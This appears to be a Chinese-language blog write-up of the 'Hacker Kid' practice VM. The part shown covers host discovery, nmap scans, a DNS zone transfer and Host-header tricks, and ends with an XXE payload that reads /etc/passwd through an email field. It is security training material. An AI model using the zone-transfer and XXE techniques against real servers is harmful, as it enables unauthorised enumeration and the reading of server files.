@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="e1iwRhdDRUGkBandwtaXVgqhNwYn1qtFuAYbOSPWpcI">
+  <meta name="baidu-site-verification" content="code-NObBqxefR1">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="dns域传送 | XXE注入 | php封装器 | SSTI模板注入 | python Capabilities提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="打靶练习7-Hakcer_Kid">
+<meta property="og:url" content="http://example.com/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A07-Hakcer-Kid/index.html">
+<meta property="og:site_name" content="ShadowFl0w">
+<meta property="og:description" content="dns域传送 | XXE注入 | php封装器 | SSTI模板注入 | python Capabilities提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/pics/%E6%89%93%E9%9D%B6/18.jpg">
+<meta property="og:image" content="http://example.com/images/pics/%E6%89%93%E9%9D%B6/19.jpg">
+<meta property="og:image" content="http://example.com/images/pics/%E6%89%93%E9%9D%B6/20.jpg">
+<meta property="og:image" content="http://example.com/images/pics/%E6%89%93%E9%9D%B6/21.jpg">
+<meta property="og:image" content="http://example.com/images/pics/%E6%89%93%E9%9D%B6/22.jpg">
+<meta property="og:image" content="http://example.com/images/pics/%E6%89%93%E9%9D%B6/23.jpg">
+<meta property="og:image" content="http://example.com/images/pics/%E6%89%93%E9%9D%B6/24.jpg">
+<meta property="og:image" content="http://example.com/images/pics/%E6%89%93%E9%9D%B6/25.jpg">
+<meta property="og:image" content="http://example.com/images/pics/%E6%89%93%E9%9D%B6/26.jpg">
+<meta property="og:image" content="http://example.com/images/pics/%E6%89%93%E9%9D%B6/27.jpg">
+<meta property="og:image" content="http://example.com/images/pics/%E6%89%93%E9%9D%B6/28.jpg">
+<meta property="og:image" content="http://example.com/images/pics/%E6%89%93%E9%9D%B6/29.jpg">
+<meta property="article:published_time" content="2022-11-22T09:16:03.000Z">
+<meta property="article:modified_time" content="2022-11-22T09:16:03.342Z">
+<meta property="article:author" content="ShadowFl0w">
+<meta property="article:tag" content="打靶">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/pics/%E6%89%93%E9%9D%B6/18.jpg">
+
+<link rel="canonical" href="http://example.com/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A07-Hakcer-Kid/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>打靶练习7-Hakcer_Kid | ShadowFl0w</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ShadowFl0w</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Nothing</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A07-Hakcer-Kid/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="ShadowFl0w">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ShadowFl0w">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          打靶练习7-Hakcer_Kid
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-11-22 17:16:03" itemprop="dateCreated datePublished" datetime="2022-11-22T17:16:03+08:00">2022-11-22</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index"><span itemprop="name">红队技术</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>dns域传送 | XXE注入 | php封装器 | SSTI模板注入 | python Capabilities提权</p>
+<span id="more"></span>
+
+
+
+<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><h3 id="arp局域网扫描"><a href="#arp局域网扫描" class="headerlink" title="arp局域网扫描"></a>arp局域网扫描</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[root@kali ~]</span># sudo arp-scan -l</span><br><span class="line"></span><br><span class="line">Interface: eth0, type: EN10MB, MAC: <span class="number">00</span>:0c:<span class="number">29</span>:<span class="number">03</span>:ac:<span class="number">71</span>, IPv4: <span class="number">172</span>.<span class="number">16</span>.<span class="number">42</span>.<span class="number">147</span></span><br><span class="line">Starting arp-scan <span class="number">1</span>.<span class="number">9</span>.<span class="number">7</span> with <span class="number">256</span> hosts (https://github.com/royhills/arp-scan)</span><br><span class="line"><span class="number">172.16.42.1</span>	<span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:c0:<span class="number">00</span>:<span class="number">08</span>	VMware, Inc.</span><br><span class="line"><span class="number">172.16.42.2</span>	<span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:fd:8b:c9	VMware, Inc.</span><br><span class="line"><span class="number">172.16.42.207</span>	<span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:eb:<span class="number">89</span>:<span class="number">45</span>	PCS Systemtechnik GmbH</span><br><span class="line"><span class="number">172.16.42.254</span>	<span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:e2:0c:<span class="number">93</span>	VMware, Inc.</span><br></pre></td></tr></table></figure>
+
+<p>确定172.16.42.207为目标机器。</p>
+<h3 id="nmap全端口扫描"><a href="#nmap全端口扫描" class="headerlink" title="nmap全端口扫描"></a>nmap全端口扫描</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@kali ~]# sudo <span class="keyword">nmap</span> -<span class="keyword">p</span>- <span class="number">172.16</span>.<span class="number">42.207</span></span><br><span class="line">Starting Nmap <span class="number">7.91</span> ( http<span class="variable">s:</span>//<span class="keyword">nmap</span>.org ) at <span class="number">2022</span>-<span class="number">11</span>-<span class="number">18</span> <span class="number">23</span>:<span class="number">19</span> EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">172.16</span>.<span class="number">42.207</span></span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00052</span>s latency).</span><br><span class="line">Not shown: <span class="number">65532</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">53</span>/tcp   <span class="keyword">open</span>  domain</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">9999</span>/tcp <span class="keyword">open</span>  abyss</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[root@kali ~]</span># <span class="selector-tag">sudo</span> <span class="selector-tag">nmap</span> <span class="selector-tag">-p53</span>,<span class="selector-tag">80</span>,<span class="selector-tag">9999</span> <span class="selector-tag">172</span><span class="selector-class">.16</span><span class="selector-class">.42</span><span class="selector-class">.207</span> <span class="selector-tag">-sV</span></span><br><span class="line"><span class="selector-tag">Starting</span> <span class="selector-tag">Nmap</span> <span class="selector-tag">7</span><span class="selector-class">.91</span> ( <span class="attribute">https</span>:<span class="comment">//nmap.org ) at 2022-11-18 23:21 EST</span></span><br><span class="line">Nmap scan report for <span class="number">172.16</span>.<span class="number">42.207</span></span><br><span class="line">Host is up (<span class="number">0.00055s</span> latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">53</span>/tcp   open  domain  ISC BIND <span class="number">9.16</span>.<span class="number">1</span> (Ubuntu Linux)</span><br><span class="line"><span class="number">80</span>/tcp   open  http    Apache httpd <span class="number">2.4</span>.<span class="number">41</span> ((Ubuntu))</span><br><span class="line"><span class="number">9999</span>/tcp open  http    Tornado httpd <span class="number">6.1</span></span><br><span class="line">MAC <span class="attribute">Address</span>: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="attribute">EB</span>:<span class="number">89</span>:<span class="number">45</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service <span class="attribute">Info</span>: <span class="attribute">OS</span>: Linux; <span class="attribute">CPE</span>: <span class="attribute">cpe</span>:/<span class="attribute">o</span>:<span class="attribute">linux</span>:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at <span class="attribute">https</span>:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap <span class="attribute">done</span>: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">7.25</span> seconds</span><br></pre></td></tr></table></figure>
+
+<p>Tornado是一个Python开发的web服务，比django轻量，速度快</p>
+<h2 id="外部突破"><a href="#外部突破" class="headerlink" title="外部突破"></a>外部突破</h2><h3 id="53端口的dns服务"><a href="#53端口的dns服务" class="headerlink" title="53端口的dns服务"></a>53端口的dns服务</h3><p><strong>域名解析通常是53端口，但是都是用的udp53端口。dns服务器上一般tcp的53端口也是开放的，一般tcp53端口用于同一个域的的不同dns服务器做数据同步。我们日常通过域名查询ip是走udp的53端口。但是我们用nmap默认只扫描53的tcp端口</strong></p>
+<h3 id="nmap-udp扫描"><a href="#nmap-udp扫描" class="headerlink" title="nmap udp扫描"></a>nmap udp扫描</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@kali ~]# <span class="keyword">nmap</span> -p53 -sU <span class="number">172.16</span>.<span class="number">42.207</span> -sV</span><br><span class="line">Starting Nmap <span class="number">7.91</span> ( http<span class="variable">s:</span>//<span class="keyword">nmap</span>.org ) at <span class="number">2022</span>-<span class="number">11</span>-<span class="number">18</span> <span class="number">23</span>:<span class="number">31</span> EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">172.16</span>.<span class="number">42.207</span></span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00084</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">53</span>/udp <span class="keyword">open</span>  domain  ISC BIND <span class="number">9.16</span>.<span class="number">1</span> (Ubuntu Linux)</span><br></pre></td></tr></table></figure>
+
+<p>确定53端口的udp服务也是开放的。</p>
+<h3 id="删除url的-号"><a href="#删除url的-号" class="headerlink" title="删除url的#号"></a>删除url的#号</h3><p>访问<a target="_blank" rel="noopener" href="http://172.16.42.207/#app.html%EF%BC%8C%E5%88%A0%E9%99%A4#%E5%8F%B7%EF%BC%8C%E5%86%8D%E8%AE%BF%E9%97%AE">http://172.16.42.207/#app.html，删除#号，再访问</a></p>
+<h3 id="查看首页源码"><a href="#查看首页源码" class="headerlink" title="查看首页源码"></a>查看首页源码</h3><p>发现如下注释</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;div class=&quot;container py-5&quot;&gt;</span></span><br><span class="line"><span class="comment">  &lt;h1&gt;Thanks&lt;/h1&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> TO DO: Use a GET parameter page_no  to view pages.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Optional JavaScript --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="爆破page-no"><a href="#爆破page-no" class="headerlink" title="爆破page_no"></a>爆破page_no</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">172.16.42.207</span>/?page_no=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>page_no=21的时候，出现如下</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Okay so you want <span class="keyword">me</span> <span class="keyword">to</span> speak something ?</span><br><span class="line">I am a hacker kid <span class="keyword">not</span> a dumb hacker. So i created <span class="keyword">some</span> subdomains <span class="keyword">to</span> <span class="literal">return</span> <span class="keyword">back</span> <span class="keyword">on</span> <span class="keyword">the</span> server whenever i want!!</span><br><span class="line">Out <span class="keyword">of</span> <span class="keyword">my</span> many homes...one such home..one such home <span class="keyword">for</span> <span class="keyword">me</span> : hackers.blackhat.<span class="keyword">local</span></span><br></pre></td></tr></table></figure>
+
+<p>提示了放了多个后门域名，其中有<code> hackers.blackhat.local</code>域名。</p>
+<p>对于同一个ip，同一个端口，其实也可以通过不同的域名访问不同的系统。叫做虚拟主机。</p>
+<p>我们可以编辑/etc/hosts添加域名对应ip，也可以抓包替换host。</p>
+<p>当我们访问hackers.blackhat.local没发现不同，blackhat.local是403。</p>
+<h3 id="DNS-axfr-攻击（DNS域传输漏洞）"><a href="#DNS-axfr-攻击（DNS域传输漏洞）" class="headerlink" title="DNS axfr 攻击（DNS域传输漏洞）"></a>DNS axfr 攻击（DNS域传输漏洞）</h3><p>可以对一个dns服务器发一个axfr请求，如果服务器支持，就会返回指定域的所有dns主机记录。</p>
+<p>对于一个正常的dns服务器，他的axfr请求应该是服务器直接通过53tcp端口进行数据传输用的。</p>
+<p>使用dig命令请求</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@kali ~]# dig axfr @<span class="number">172.16</span><span class="number">.42</span><span class="number">.207</span> blackhat.<span class="keyword">local</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG <span class="number">9.16</span><span class="number">.11</span>-Debian &lt;&lt;&gt;&gt; axfr @<span class="number">172.16</span><span class="number">.42</span><span class="number">.207</span> blackhat.<span class="keyword">local</span></span><br><span class="line">; (<span class="number">1</span> <span class="keyword">server</span> <span class="built_in">found</span>)</span><br><span class="line">;; <span class="keyword">global</span> <span class="keyword">options</span>: +cmd</span><br><span class="line">blackhat.<span class="keyword">local</span>.		<span class="number">10800</span>	<span class="keyword">IN</span>	SOA	blackhat.<span class="keyword">local</span>. hackerkid.blackhat.<span class="keyword">local</span>. <span class="number">1</span> <span class="number">10800</span> <span class="number">3600</span> <span class="number">604800</span> <span class="number">3600</span></span><br><span class="line">blackhat.<span class="keyword">local</span>.		<span class="number">10800</span>	<span class="keyword">IN</span>	NS	ns1.blackhat.<span class="keyword">local</span>.</span><br><span class="line">blackhat.<span class="keyword">local</span>.		<span class="number">10800</span>	<span class="keyword">IN</span>	MX	<span class="number">10</span> mail.blackhat.<span class="keyword">local</span>.</span><br><span class="line">blackhat.<span class="keyword">local</span>.		<span class="number">10800</span>	<span class="keyword">IN</span>	A	<span class="number">192.168</span><span class="number">.14</span><span class="number">.143</span></span><br><span class="line">ftp.blackhat.<span class="keyword">local</span>.	<span class="number">10800</span>	<span class="keyword">IN</span>	CNAME	blackhat.<span class="keyword">local</span>.</span><br><span class="line">hacker.blackhat.<span class="keyword">local</span>.	<span class="number">10800</span>	<span class="keyword">IN</span>	CNAME	hacker.blackhat.<span class="keyword">local</span>.blackhat.<span class="keyword">local</span>.</span><br><span class="line">mail.blackhat.<span class="keyword">local</span>.	<span class="number">10800</span>	<span class="keyword">IN</span>	A	<span class="number">192.168</span><span class="number">.14</span><span class="number">.143</span></span><br><span class="line">ns1.blackhat.<span class="keyword">local</span>.	<span class="number">10800</span>	<span class="keyword">IN</span>	A	<span class="number">192.168</span><span class="number">.14</span><span class="number">.143</span></span><br><span class="line">ns2.blackhat.<span class="keyword">local</span>.	<span class="number">10800</span>	<span class="keyword">IN</span>	A	<span class="number">192.168</span><span class="number">.14</span><span class="number">.143</span></span><br><span class="line">www.blackhat.<span class="keyword">local</span>.	<span class="number">10800</span>	<span class="keyword">IN</span>	CNAME	blackhat.<span class="keyword">local</span>.</span><br><span class="line">blackhat.<span class="keyword">local</span>.		<span class="number">10800</span>	<span class="keyword">IN</span>	SOA	blackhat.<span class="keyword">local</span>. hackerkid.blackhat.<span class="keyword">local</span>. <span class="number">1</span> <span class="number">10800</span> <span class="number">3600</span> <span class="number">604800</span> <span class="number">3600</span></span><br><span class="line">;; Query <span class="type">time</span>: <span class="number">3</span> msec</span><br><span class="line">;; <span class="keyword">SERVER</span>: <span class="number">172.16</span><span class="number">.42</span><span class="number">.207</span>#<span class="number">53</span>(<span class="number">172.16</span><span class="number">.42</span><span class="number">.207</span>)</span><br><span class="line">;; <span class="keyword">WHEN</span>: Sat Nov <span class="number">19</span> <span class="number">03</span>:<span class="number">17</span>:<span class="number">55</span> EST <span class="number">2022</span></span><br><span class="line">;; XFR size: <span class="number">11</span> records (messages <span class="number">1</span>, bytes <span class="number">353</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>替换host为发现的Host头<code>hackerkid.blackhat.local</code></p>
+<figure class="highlight plaintext"><figcaption><span>/ HTTP/1.1</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: hackerkid.blackhat.local</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>返回了新的页面。</p>
+<p><img src="../images/pics/%E6%89%93%E9%9D%B6/18.jpg"></p>
+<h3 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h3><p>通过提交上述页面抓包。为了正常在浏览器操作。我们还是要在本地绑定dns解析。</p>
+<p>再次通过浏览器访问。</p>
+<p><img src="../images/pics/%E6%89%93%E9%9D%B6/19.jpg"></p>
+<p>抓到如下数据包</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/process.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>hackerkid.blackhat.local</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain;charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>122</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://hackerkid.blackhat.local</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://hackerkid.blackhat.local/</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>a<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">tel</span>&gt;</span>a<span class="tag">&lt;/<span class="name">tel</span>&gt;</span><span class="tag">&lt;<span class="name">email</span>&gt;</span>a@qq.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>a<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><strong>可以看见提交的<u>xml格式</u>的数据，并且我们<u>不管在emai插入任何字段，服务器都原封不动的返回</u>。于是猜测存在返回型xxe漏洞。</strong></p>
+<p>使用CyberChef的xml美化功能，美化一下为</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>a<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">tel</span>&gt;</span>a<span class="tag">&lt;/<span class="name">tel</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">email</span>&gt;</span>a@qq.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>a<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>插入引入外部实体的代码。</p>
+<p><code>&lt;!DOCTYPE foo [&lt;!ENTITY xxetest SYSTEM &#39;file:///etc/passwd&#39;&gt;]&gt;</code></p>
+<p>由<strong>于只有email处有回显，所以写成<code>&amp;xxetest;</code>，这样就能看到引入的外部实体文件的结果了。</strong></p>
+<p><img src="../images/pics/%E6%89%93%E9%9D%B6/20.jpg"></p>
